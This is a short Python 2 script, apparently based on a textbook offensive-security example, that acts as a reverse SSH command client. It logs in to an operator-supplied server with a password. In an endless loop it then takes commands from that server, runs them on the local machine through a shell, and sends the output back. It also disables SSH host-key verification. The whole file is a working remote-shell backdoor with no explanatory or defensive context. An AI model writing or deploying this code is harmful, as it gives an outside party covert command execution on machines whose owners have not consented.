__author__ = 'med'

import threading
import paramiko
import subprocess as sub
import os
import sys

if len(sys.argv[1:]) !=5:
    print "USAGE: python ssh_Rcmd.py [server_ip] [server_port] [username] [passwd] [command]"
    sys.exit(0)

ip = sys.argv[1]
port = int(sys.argv[2])
user = sys.argv[3]
passwd = sys.argv[4]
command = sys.argv[5]

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    #   client.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print ssh_session.recv(1024) # read welcoming message
        while True:
            command = ssh_session.recv(1024) # get the command from the server
            try:
                cmd_output = sub.check_output(command, shell=True) # execute the command on the client
                ssh_session.send(cmd_output) # send output to the server
            except Exception, e:
                ssh_session.send(str(e))
        client.close()
    return


ssh_command(ip, port, user, passwd, command)
